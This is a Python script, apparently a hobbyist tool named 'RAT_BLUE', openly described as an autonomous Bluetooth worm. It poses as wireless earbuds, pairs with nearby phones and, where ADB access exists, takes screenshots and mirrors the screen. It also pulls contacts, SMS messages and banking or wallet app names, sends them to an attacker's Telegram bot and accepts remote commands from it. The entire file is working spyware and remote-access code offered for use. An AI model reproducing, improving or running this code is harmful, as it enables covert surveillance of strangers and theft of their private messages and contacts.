#!/usr/bin/env python3
"""
RAT_BLUE v3.0 AUTO-EXPLOIT - Autonomous Bluetooth Worm
Automatically detects, connects, and exploits ANY nearby phone
"""

import os
import sys
import time
import subprocess
import random
from datetime import datetime
import requests

# Telegram configuration
TELEGRAM_BOT_TOKEN = "token fatherbot"
TELEGRAM_CHAT_ID = "ID chat of userinfo"

# Spoofed device configuration - Common headphone names
SPOOF_NAMES = [
    "Mi True Wireless EBs",
    "LC CJ88",
    "M28",
    "TWS-i12",
    "Air 31",
    "Redmi Buds 3",
]
SPOOF_NAME = random.choice(SPOOF_NAMES)  # Random name each time
SPOOF_CLASS = "0x240404"  # Wearable Headset Device (CORRECT ICON!)

# Known phone manufacturer MAC prefixes
PHONE_MAC_PREFIXES = [
    "B8:7E:39",  # Motorola
    "00:1A:7D", "AC:37:43", "E8:50:8B",  # Samsung
    "F0:D1:A9", "BC:3A:EA", "A4:D1:8C",  # Apple
    "28:E1:4C", "34:80:B3",  # Xiaomi
    "F8:A4:5F",  # Huawei
    "00:E0:4C",  # Realme
]

# Exploited devices (to avoid re-exploiting)
EXPLOITED_DEVICES = []

# Active device for bot commands
ACTIVE_DEVICE = None
BOT_RUNNING = False

# Color codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
        requests.post(url, data=data, timeout=10)
        return True
    except:
        return False

def send_telegram_file(file_path, caption=""):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
            requests.post(url, files=files, data=data, timeout=60)
        return True
    except:
        return False

def send_telegram_photo(photo_path, caption=""):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        with open(photo_path, 'rb') as photo:
            files = {'photo': photo}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
            requests.post(url, files=files, data=data, timeout=30)
        return True
    except:
        return False

def print_banner():
    banner = f"""
{Colors.RED}{Colors.BOLD}
    ██████╗  █████╗ ████████╗     ██████╗ ██╗     ██╗   ██╗███████╗
    ██╔══██╗██╔══██╗╚══██╔══╝     ██╔══██╗██║     ██║   ██║██╔════╝
    ██████╔╝███████║   ██║        ██████╔╝██║     ██║   ██║█████╗  
    ██╔══██╗██╔══██║   ██║        ██╔══██╗██║     ██║   ██║██╔══╝  
    ██║  ██║██║  ██║   ██║███████╗██████╔╝███████╗╚██████╔╝███████╗
    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝╚══════╝╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
{Colors.RESET}
{Colors.MAGENTA}    AUTO-EXPLOIT + Telegram Bot v3.0{Colors.RESET}
{Colors.RED}    [!] ATTACKS ANY NEARBY PHONE + REMOTE CONTROL [!]{Colors.RESET}
    """
    print(banner)

def get_telegram_updates(offset=0):
    """Get updates from Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
        params = {"offset": offset, "timeout": 10}
        response = requests.get(url, params=params, timeout=15)
        return response.json()
    except:
        return None

def cmd_screenshot():
    """Take screenshot"""
    global ACTIVE_DEVICE
    if not ACTIVE_DEVICE:
        send_telegram("[ERROR] No active device")
        return
    
    screenshot_path = f"/tmp/rat_screenshot_{int(time.time())}.png"
    run_command(f"adb -s {ACTIVE_DEVICE} shell screencap -p /sdcard/screen.png")
    run_command(f"adb -s {ACTIVE_DEVICE} pull /sdcard/screen.png {screenshot_path}")
    run_command(f"adb -s {ACTIVE_DEVICE} shell rm /sdcard/screen.png")
    
    if os.path.exists(screenshot_path):
        send_telegram_photo(screenshot_path, f"Screenshot - {datetime.now().strftime('%H:%M:%S')}")
        os.remove(screenshot_path)

def cmd_contacts():
    """Extract contacts"""
    global ACTIVE_DEVICE
    if not ACTIVE_DEVICE:
        send_telegram("[ERROR] No active device")
        return
    
    raw_contacts = run_command(f"adb -s {ACTIVE_DEVICE} shell content query --uri content://contacts/phones")
    
    # Parse and clean contacts
    contacts_list = []
    for line in raw_contacts.split('Row:'):
        if 'display_name=' in line and 'number=' in line:
            try:
                # Extract display_name
                name_part = line.split('display_name=')[1]
                name = name_part.split(',')[0].strip()
                
                # Extract number
                number_part = line.split('number=')[1]
                number = number_part.split(',')[0].strip()
                
                # Only add if both exist and name is not NULL
                if name and number and name != 'NULL':
                    contacts_list.append(f"{name}: {number}")
            except:
                pass
    
    contacts_file = f"/tmp/rat_contacts_{int(time.time())}.txt"
    
    with open(contacts_file, 'w') as f:
        f.write(f"RAT_BLUE - Contacts\n")
        f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total: {len(contacts_list)}\n")
        f.write(f"{'='*60}\n\n")
        for contact in contacts_list:
            f.write(f"{contact}\n")
    
    send_telegram_file(contacts_file, f"Contacts ({len(contacts_list)} total)")
    os.remove(contacts_file)

def cmd_info():
    """Show device info"""
    global ACTIVE_DEVICE
    if not ACTIVE_DEVICE:
        send_telegram("[ERROR] No active device")
        return
    
    brand = run_command(f"adb -s {ACTIVE_DEVICE} shell getprop ro.product.brand")
    model = run_command(f"adb -s {ACTIVE_DEVICE} shell getprop ro.product.model")
    android = run_command(f"adb -s {ACTIVE_DEVICE} shell getprop ro.build.version.release")
    
    msg = f"""Device Information

Brand: {brand}
Model: {model}
Android: {android}
Device ID: {ACTIVE_DEVICE}
"""
    send_telegram(msg)

def cmd_help():
    """Show help"""
    help_text = """RAT_BLUE Control Panel

Commands:
/screenshot - Capture screen
/contacts - Extract contacts
/sms - Extract SMS messages
/apps - List installed apps
/info - Device information
/help - This menu

Status: Active
"""
    send_telegram(help_text)

def cmd_sms():
    """Extract SMS messages"""
    global ACTIVE_DEVICE
    if not ACTIVE_DEVICE:
        send_telegram("[ERROR] No active device")
        return
    
    raw_sms = run_command(f"adb -s {ACTIVE_DEVICE} shell content query --uri content://sms/inbox")
    
    # Parse SMS
    sms_list = []
    for line in raw_sms.split('Row:'):
        if 'address=' in line and 'body=' in line:
            try:
                number = line.split('address=')[1].split(',')[0].strip()
                message = line.split('body=')[1].split(',')[0].strip()
                if number and message:
                    sms_list.append(f"From: {number}\n{message}\n")
            except:
                pass
    
    sms_file = f"/tmp/rat_sms_{int(time.time())}.txt"
    
    with open(sms_file, 'w') as f:
        f.write(f"RAT_BLUE - SMS Messages\n")
        f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total: {len(sms_list)}\n")
        f.write(f"{'='*60}\n\n")
        for sms in sms_list[:50]:  # Limit to 50 messages
            f.write(f"{sms}\n")
    
    send_telegram_file(sms_file, f"SMS Messages ({len(sms_list)} total)")
    os.remove(sms_file)

def cmd_apps():
    """List installed apps"""
    global ACTIVE_DEVICE
    if not ACTIVE_DEVICE:
        send_telegram("[ERROR] No active device")
        return
    
    raw_apps = run_command(f"adb -s {ACTIVE_DEVICE} shell pm list packages")
    
    # Clean app names
    apps_list = []
    for line in raw_apps.split('\n'):
        if line.startswith('package:'):
            app = line.replace('package:', '').strip()
            # Filter interesting apps
            if any(x in app for x in ['whatsapp', 'facebook', 'instagram', 'telegram', 'bank', 'pay', 'wallet']):
                apps_list.append(app)
    
    apps_file = f"/tmp/rat_apps_{int(time.time())}.txt"
    
    with open(apps_file, 'w') as f:
        f.write(f"RAT_BLUE - Installed Apps\n")
        f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total: {len(apps_list)}\n")
        f.write(f"{'='*60}\n\n")
        for app in apps_list:
            f.write(f"{app}\n")
    
    send_telegram_file(apps_file, f"Apps ({len(apps_list)} interesting)")
    os.remove(apps_file)

def process_telegram_command(text):
    """Process Telegram command"""
    if text == '/screenshot':
        cmd_screenshot()
    elif text == '/contacts':
        cmd_contacts()
    elif text == '/sms':
        cmd_sms()
    elif text == '/apps':
        cmd_apps()
    elif text == '/info':
        cmd_info()
    elif text == '/help':
        cmd_help()

def telegram_bot_thread():
    """Telegram bot background thread"""
    global BOT_RUNNING
    offset = 0
    
    while BOT_RUNNING:
        try:
            updates = get_telegram_updates(offset)
            
            if updates and updates.get('ok'):
                for update in updates.get('result', []):
                    offset = update['update_id'] + 1
                    
                    if 'message' in update:
                        message = update['message']
                        if str(message['chat']['id']) == TELEGRAM_CHAT_ID:
                            text = message.get('text', '')
                            if text.startswith('/'):
                                print_info(f"Telegram command: {text}")
                                process_telegram_command(text)
            
            time.sleep(2)
        except:
            time.sleep(5)

def print_banner():
    banner = f"""
{Colors.RED}{Colors.BOLD}
    ██████╗  █████╗ ████████╗     ██████╗ ██╗     ██╗   ██╗███████╗
    ██╔══██╗██╔══██╗╚══██╔══╝     ██╔══██╗██║     ██║   ██║██╔════╝
    ██████╔╝███████║   ██║        ██████╔╝██║     ██║   ██║█████╗  
    ██╔══██╗██╔══██║   ██║        ██╔══██╗██║     ██║   ██║██╔══╝  
    ██║  ██║██║  ██║   ██║███████╗██████╔╝███████╗╚██████╔╝███████╗
    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝╚══════╝╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
{Colors.RESET}
{Colors.MAGENTA}    AUTO-EXPLOIT MODE - Autonomous Bluetooth Worm v3.0{Colors.RESET}
{Colors.RED}    [!] ATTACKS ANY NEARBY PHONE AUTOMATICALLY [!]{Colors.RESET}
    """
    print(banner)

def print_status(symbol, message, color=Colors.WHITE):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"{Colors.BOLD}[{timestamp}]{Colors.RESET} {color}{symbol}{Colors.RESET} {message}")

def print_info(msg): print_status("*", msg, Colors.BLUE)
def print_success(msg): print_status("+", msg, Colors.GREEN)
def print_warning(msg): print_status("!", msg, Colors.YELLOW)
def print_error(msg): print_status("-", msg, Colors.RED)

def run_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        return result.stdout.strip()
    except:
        return ""

def is_phone_device(mac, name):
    """Check if device is likely a phone"""
    mac_prefix = mac[:8].upper()
    for prefix in PHONE_MAC_PREFIXES:
        if mac_prefix == prefix.upper():
            return True
    
    phone_keywords = ['phone', 'android', 'iphone', 'galaxy', 'pixel', 'xiaomi', 'motorola', 'huawei', 'oneplus', 'moto']
    name_lower = name.lower()
    for keyword in phone_keywords:
        if keyword in name_lower:
            return True
    
    return False

def setup_bluetooth_spoof():
    """Setup Bluetooth spoofing"""
    print_info("Setting up Bluetooth spoofing...")
    
    run_command("bluetoothctl power on")
    run_command("rfkill unblock bluetooth")
    
    # Set device class FIRST (before name)
    run_command(f"hciconfig hci0 class {SPOOF_CLASS}")
    time.sleep(1)
    
    # Then set name
    run_command(f"hciconfig hci0 name '{SPOOF_NAME}'")
    run_command(f"bluetoothctl system-alias '{SPOOF_NAME}'")
    
    # Make discoverable and pairable
    run_command("bluetoothctl discoverable on")
    run_command("bluetoothctl pairable on")
    run_command("bluetoothctl agent on")
    run_command("bluetoothctl default-agent")
    
    print_success(f"Spoofed as '{SPOOF_NAME}' (Headphones)")
    return True

def scan_for_phones():
    """Continuously scan for nearby phones"""
    print_info("Scanning for nearby phones...")
    
    # Start scan
    scan_proc = subprocess.Popen(
        "bluetoothctl scan on",
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
    time.sleep(10)
    
    output = run_command("bluetoothctl devices")
    run_command("bluetoothctl scan off")
    scan_proc.terminate()
    
    phones = []
    if output:
        for line in output.split('\n'):
            if 'Device' in line:
                parts = line.split()
                if len(parts) >= 3:
                    mac = parts[1]
                    name = ' '.join(parts[2:])
                    
                    # Accept ANY device for testing
                    if mac not in EXPLOITED_DEVICES:
                        phones.append((mac, name))
    
    return phones

def attempt_pairing(mac, name):
    """Attempt to pair with target device"""
    print_info(f"Attempting to pair with {name} ({mac})...")
    
    # Try to pair
    result = run_command(f"bluetoothctl pair {mac}")
    time.sleep(3)
    
    # Check if paired
    info = run_command(f"bluetoothctl info {mac}")
    if "Paired: yes" in info:
        print_success(f"Successfully paired with {name}!")
        return True
    
    print_warning(f"Pairing failed with {name}")
    return False

def attempt_connection(mac, name):
    """Attempt to connect to paired device"""
    print_info(f"Attempting to connect to {name}...")
    
    result = run_command(f"bluetoothctl connect {mac}")
    time.sleep(2)
    
    info = run_command(f"bluetoothctl info {mac}")
    if "Connected: yes" in info:
        print_success(f"Connected to {name}!")
        return True
    
    return False

def exploit_device(mac, name):
    """Exploit connected device via ADB"""
    print_warning(f"Exploiting {name}...")
    
    # Check for ADB connection
    adb_devices = run_command("adb devices")
    
    if "device" in adb_devices:
        device_lines = [l for l in adb_devices.split('\n') if '\tdevice' in l]
        if device_lines:
            device_id = device_lines[0].split('\t')[0]
            
            # Get device info
            model = run_command(f"adb -s {device_id} shell getprop ro.product.model")
            brand = run_command(f"adb -s {device_id} shell getprop ro.product.brand")
            
            print_success(f"ADB access gained: {brand} {model}")
            
            # Take screenshot
            screenshot_path = f"/tmp/rat_blue_auto_{int(time.time())}.png"
            run_command(f"adb -s {device_id} shell screencap -p /sdcard/screen.png")
            run_command(f"adb -s {device_id} pull /sdcard/screen.png {screenshot_path}")
            run_command(f"adb -s {device_id} shell rm /sdcard/screen.png")
            
            # Start screen mirror
            print_info("Starting screen mirror...")
            subprocess.Popen(f"scrcpy -s {device_id}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
            print_success("Screen mirror active!")
            
            # Send to Telegram
            alert = f"""
🔴 <b>RAT_BLUE AUTO-EXPLOIT - NEW VICTIM</b> 🔴

⏰ <b>Time:</b> {datetime.now().strftime("%H:%M:%S")}

📱 <b>Device:</b> {brand} {model}
🔗 <b>MAC:</b> {mac}
📛 <b>Name:</b> {name}

✅ <b>Status:</b> Fully compromised
🎯 <b>Method:</b> Bluetooth auto-pairing
🖥️ <b>Screen Mirror:</b> Active
"""
            send_telegram(alert)
            
            print_success(f"Device {name} fully exploited!")
            print_success("Data sent to Telegram!")
            
            # Set as active device for bot commands
            global ACTIVE_DEVICE, BOT_RUNNING
            ACTIVE_DEVICE = device_id
            
            # Start Telegram bot if not running
            if not BOT_RUNNING:
                BOT_RUNNING = True
                import threading
                bot_thread = threading.Thread(target=telegram_bot_thread, daemon=True)
                bot_thread.start()
                print_success("Telegram bot activated!")
                send_telegram("\nTelegram Bot Active\n\nUse /help for commands")
            
            EXPLOITED_DEVICES.append(mac)
            return True
    
    return False

def main():
    try:
        os.system('clear')
        print_banner()
        
        print_warning("AUTO-EXPLOIT MODE ACTIVATED")
        print_warning("This will automatically attack ANY nearby phone!")
        print_warning("Press Ctrl+C to stop")
        print()
        time.sleep(3)
        
        # Setup spoofing
        setup_bluetooth_spoof()
        print()
        
        print_success("Worm activated - hunting for targets...")
        print_info(f"Exploited devices: {len(EXPLOITED_DEVICES)}")
        print()
        
        # Main loop - continuously hunt for targets
        scan_count = 0
        while True:
            scan_count += 1
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.BOLD}SCAN #{scan_count}{Colors.RESET}")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
            print()
            
            # Scan for phones
            phones = scan_for_phones()
            
            if phones:
                print_success(f"Found {len(phones)} potential targets:")
                for i, (mac, name) in enumerate(phones, 1):
                    print(f"  {Colors.YELLOW}[{i}]{Colors.RESET} {name} ({mac})")
                print()
                
                # Try to exploit each phone
                for mac, name in phones:
                    print(f"{Colors.MAGENTA}>>> Targeting: {name}{Colors.RESET}")
                    
                    # Try pairing
                    if attempt_pairing(mac, name):
                        # Try connecting
                        if attempt_connection(mac, name):
                            # Try exploiting
                            if exploit_device(mac, name):
                                print_success(f"✓ {name} compromised!")
                                print()
                                print_success("Target successfully exploited!")
                                print_info("Stopping worm - mission complete")
                                print()
                                return  # Exit after first successful exploit
                            else:
                                print_warning(f"✗ {name} - ADB not available")
                        else:
                            print_warning(f"✗ {name} - Connection failed")
                    else:
                        print_warning(f"✗ {name} - Pairing rejected")
                    
                    print()
                    time.sleep(2)
            else:
                print_warning("No new targets found")
                print()
            
            print_info(f"Total exploited: {len(EXPLOITED_DEVICES)}")
            print_info("Waiting 30 seconds before next scan...")
            print()
            time.sleep(30)
            
    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}[!]{Colors.RESET} Worm terminated by user")
        print(f"{Colors.GREEN}[+]{Colors.RESET} Total devices exploited: {len(EXPLOITED_DEVICES)}")
        print(f"{Colors.YELLOW}[*]{Colors.RESET} Cleaning up...")
        run_command("bluetoothctl discoverable off")
        run_command("bluetoothctl pairable off")
        time.sleep(1)
        print(f"{Colors.GREEN}[+]{Colors.RESET} Goodbye!\n")
        sys.exit(0)

if __name__ == "__main__":
    main()
